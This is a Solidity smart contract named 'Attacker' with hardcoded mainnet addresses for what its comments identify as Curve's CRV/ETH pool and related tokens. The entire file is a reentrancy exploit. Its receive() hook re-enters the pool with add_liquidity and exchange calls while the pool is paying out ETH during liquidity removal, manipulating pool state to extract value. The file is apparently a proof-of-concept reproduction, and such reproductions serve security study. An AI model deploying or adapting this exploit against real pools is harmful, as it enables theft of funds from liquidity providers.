// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

// Uncomment this line to use console.log
// import "hardhat/console.sol";

interface ICurve {
    function add_liquidity(
        uint256[2] calldata amounts,
        uint256 min_mint_amount,
        bool use_eth
    ) external payable returns (uint256);

    function remove_liquidity(
        uint256 _amount,
        uint256[2] calldata min_amounts,
        bool use_eth
    ) external;

    function remove_liquidity_one_coin(
        uint256 token_amount,
        uint256 i,
        uint256 min_amount,
        bool use_eth
    ) external returns (uint256);

    function exchange(
        uint256 i,
        uint256 j,
        uint256 dx,
        uint256 min_dy,
        bool use_eth
    ) external payable returns (uint256);
}

interface IERC20 {
    function balanceOf(address owner)external view returns(uint256);
    function approve(address spender, uint256 amount)external;
}

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;  
}

contract Attacker {
    address public curve = address(0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511); // the CRVETH pool of curve
    address public crvCRVETH = address(0xEd4064f376cB8d68F770FB1Ff088a3d0F3FF5c4d); // the lp token of CRVETH pool
    address public crv = address(0xD533a949740bb3306d119CC777fa900bA034cd52); // CRV token
    address public weth = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); // WETH token

    constructor() {
        IERC20(crv).approve(curve, type(uint256).max);
        IERC20(crvCRVETH).approve(curve, type(uint256).max);
    }

    function execution() public {
        //
        uint256 wethAmount = IERC20(weth).balanceOf(address(this));
        IWETH(weth).withdraw(wethAmount);
        //
        uint256[2] memory amounts = [uint256(400000000000000000000), uint256(0)];
        uint256 lpAmount = ICurve(curve).add_liquidity{value: uint256(400000000000000000000)}(amounts, uint256(0), true);
        //
        lpAmount = IERC20(crvCRVETH).balanceOf(address(this));
        ICurve(curve).remove_liquidity(lpAmount, [uint256(0), uint256(0)], true);
        //
        lpAmount = IERC20(crvCRVETH).balanceOf((address(this)));
        ICurve(curve).remove_liquidity_one_coin(lpAmount, 0, 0, true);
        //
        uint256 crvBalance = IERC20(crv).balanceOf(address(this));
        ICurve(curve).exchange(1, 0, crvBalance, 0, true);
    }

    receive() external payable {
        if (msg.sender == curve && msg.value < 500000000000000000000) {
            uint256[2] memory amounts = [uint256(400000000000000000000), uint256(0)];
            ICurve(curve).add_liquidity{value: uint256(400000000000000000000)}(amounts, 0, true);
            ICurve(curve).exchange{value: uint256(500000000000000000000)}(0, 1, uint256(500000000000000000000), 0, true);
        }
    }
}
